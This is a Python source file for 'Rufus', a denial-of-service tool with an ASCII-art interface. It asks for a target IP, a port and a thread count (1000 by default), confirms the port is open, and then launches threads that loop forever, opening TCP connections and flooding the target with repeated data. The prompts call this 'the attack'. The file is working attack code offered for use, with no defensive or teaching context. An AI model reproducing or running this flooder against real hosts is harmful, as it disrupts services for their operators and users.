import socket

from threading import Thread

from pystyle import Colorate, Center, Write, Anime, Colors, System, Col


__license__ = "BKS"





class Rufus:
    def check_port(ip: str, port: int) -> bool:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)

            addr = (ip, port)
            check = sock.connect_ex(addr)
            sock.close()

            return not check
        except:
            return False

    def dos(ip: str, port: int, th: int):
        global n
        n = 1
        for i in range(th):
            Thread(target=Rufus._dos, args=[ip, port]).start()
            print(Colorate.Horizontal(Colors.blue_to_red, f"Creating thread number {i + 1}..."))


    def _dos(ip: str, port: int):
        global n
        
        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                addr = (ip, port)
                sock.connect_ex(addr)
                print(Colorate.Horizontal(Colors.blue_to_red, f"Initializing connection number {n}..."))
                n += 1
                sock.send(b'Rufus Here -> https://github.com/billythegoat356/Rufus\n'*1024)
                print(Colorate.Horizontal(Colors.blue_to_red, f"Sending 1024 bytes to {ip}:{port}..."))
            except:
                print(Colorate.Horizontal(Colors.red_to_blue, "Error! Connection refused."))
                
        

banner = r"""
                                                              ```.......`                
                                                     `.-:/oosyyhmmdhhyyhdmy`              
                                               `-:+shdmmNNNmdhyo/-...` `-sM-              
                                          `.:ohmNMMMMNNdho:-``   `+s/     h`              
                                       .:sdNMMMMMMNNy/-`         `-`     .o               
                                   `.+hNMMMMMMNdsd+o`                   +s`               
                                 .+ymNMMMMMNyo/:...   `..````          `+.                
                               :ydmNMMMMNy:`      ..-/osshsyhso/.`-.   --                 
            ommmhyyyso/-`   `+dddMMMMMh/`       `/ssmoyh.m:+m`omyh:-+ .:                  
             oMMMMmhys/yMm/omhdMMMMNs.       `/yyddhMNMMNMmMmoN-.yd+`o:                   
              -dMMMMMN+mdyNhhMMMmd+`     .-:oyddNMMMMMMMMMMMMMNyd:+s::                    
               `hMMMMyNymhyNMNMN+`     `/+oyhsssdohydMdMMMMMMMMMNd//.                     
                `mMMMmdmsdMMMoy.       /yhssysssyhdyds+h/MMMMMMms/`                       
                 oMMMMdsNMMMMh:.       ``-..``   `-:oyhooo:NMMs.                          
                 /MMMdhMMMdd-hs:                   `./ooyooso+                            
                 sMMNmMMMMy:``+s-                     .oo+ho-                             
                `mMMMMMMmdsy/` .//                      :y/h                              
                /MMMMMMMy: .+o/`                        `o+-                              
                dMMMMMMNsy/`  .`                ./. `.- `                                 
               .MhNMMMM+ `-/:                 -o/``:-`                                    
               oN:mMNMd                     `+/`.//`                                      
               dh+mNhN:                    -+``sN/                                        
              -NyymNmm                    -- +NMMy.                                       
             .dMhdNNNh .                 -.-dMMMMNms.                                     
            :mMMmmMMMh :                ``/hNMMMMMMMNy-                                   
           oNMMMMmMMMd /                 +mhMMMMMMMMMMNs`                                 
         .yMMMMMMMMMMN`o                /dyMMMMMMMMMMMMMd-                                
        -mMMMMMMdNMMMM//-             `.ymdmmmNNNNMMMMMMMm.                               
       /NMMMMMMdNyNMMMd`+            .`y+-+ooooosyhdmmmNNMy          `-/syhy:             
      +NMMMMMMMNoNsdMMMs.:           :`N:          `.-/ohdM`      ./ymmmmmy-              
     +MMMMMMMMMMyoMysNMMo--          :`M/               `/m-   `/ymNmhdds.                
    /NmmNmmmmmmyyyNN/-hMMs-.         --yy                 .` -smMNdsymo-                  
   -dmmmmmmmsshds/-`   :dMd:`        .s:m/                `:hMMMMhodh-                    
  `dNNNNNNhyho-          :yNh-     `:ds:oNo.`           `+dMMMMN++Ny`                     
  sMMMMMMmd/               `+hh/`   `:   +MNho+//+syo .sNMMMMNs.+M+                       
 .MMMMMMm/                    `/ss+.      -dMMMMMMmdddMMMMMds+sNM/                        
 sMMMMNo`                         .://:-`   :hNMMMMMMMMMMNmNMMMM+                         
 mMMMy.                               ``.-..``.:sdMMMMMMMMMMMMMh                          
-MMh:                                            `-omMMMMMMMMMN.                          
/d/`                                                `/dddMMMMMo                           
``                                                    `sdhMMMN.                           
                                                        +ddNNy                            
                                                         :hdm/                            
                                                          /md`                            
                                                           .-"""[1:]



ascii = """\n\n
ooooooooo.                .o88o.                      
`888   `Y88.              888 `"                      
 888   .d88' oooo  oooo  o888oo  oooo  oooo   .oooo.o 
 888ooo88P'  `888  `888   888    `888  `888  d88(  "8 
 888`88b.     888   888   888     888   888  `"Y88b.  
 888  `88b.   888   888   888     888   888  o.  )88b 
o888o  o888o  `V88V"V8P' o888o    `V88V"V8P' 8""888P'\n\n"""



def tui():
    System.Clear()
    print(Colorate.Horizontal(Colors.blue_to_red, Center.XCenter(ascii)))

def main():
    System.Title("Rufus - by bks")
    System.Size(170, 55)
    Anime.Fade(Center.Center(banner), Colors.blue_to_red, Colorate.Vertical, interval=0.01, enter=True)

    tui()

    ip = Write.Input("Enter the IP address -> ", Colors.blue_to_red, interval=0.005)

    port = Write.Input("Enter the port -> ", Colors.blue_to_red, interval=0.005)

    print()

    try:
        port = int(port)
    except ValueError:
        Colorate.Error("Please enter a valid port!", wait=True)

    th = Write.Input("Enter threads (press enter for 1000) -> ", Colors.blue_to_red, interval=0.005)
    if not th: th = '1000'

    try:
        th = int(th)
    except ValueError:
        Colorate.Error("\nPlease enter a valid threads number!", wait=True)


    print('\n')

    if Rufus.check_port(ip, port):
        input(Col.cyan + f"{ip}:{port}" + Colorate.Horizontal(Colors.red_to_blue, " is opened! Press enter to start the attack..."))
    else:
        input(Col.cyan + f"{ip}:{port}" + Col.red + " is closed or doesn't respond. Cannot start the attack.")
        exit()
    
    tui()

    Rufus.dos(ip=ip, port=port, th=th)



if __name__ == '__main__':
    main()